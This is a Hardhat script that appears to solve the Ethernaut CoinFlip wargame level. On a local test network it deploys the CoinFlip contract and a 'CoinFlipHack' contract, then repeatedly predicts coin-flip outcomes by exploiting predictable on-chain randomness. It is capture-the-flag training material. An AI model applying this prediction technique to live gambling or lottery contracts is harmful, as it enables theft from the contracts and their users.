const { network, deployments, ethers, getNamedAccounts } = require("hardhat");

async function main() {
  const [owner, addr1, addr2] = await ethers.getSigners();

  console.log("Deployer : ", owner.address);

  const CoinFlip = await ethers.getContractFactory("CoinFlip");
  const CoinFlipHack = await ethers.getContractFactory("CoinFlipHack");

  const coinFlip = await CoinFlip.deploy();
  const coinFlipHack = await CoinFlipHack.deploy();

  await coinFlip.deployed();
  await coinFlipHack.deployed();

  // ------------ let's hack -------------

  for (let i = 0; i < 10; i++) {
    let predSide = await coinFlipHack.predict();
    let result = await coinFlip.callStatic.flip(predSide);

    await network.provider.request({
      method: "evm_increaseTime",
      params: [100],
    });
    await network.provider.request({ method: "evm_mine", params: [] });

    console.log("result : ", result);
  }
}

// hh run scripts/ethernaut1.js --network hardhat
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
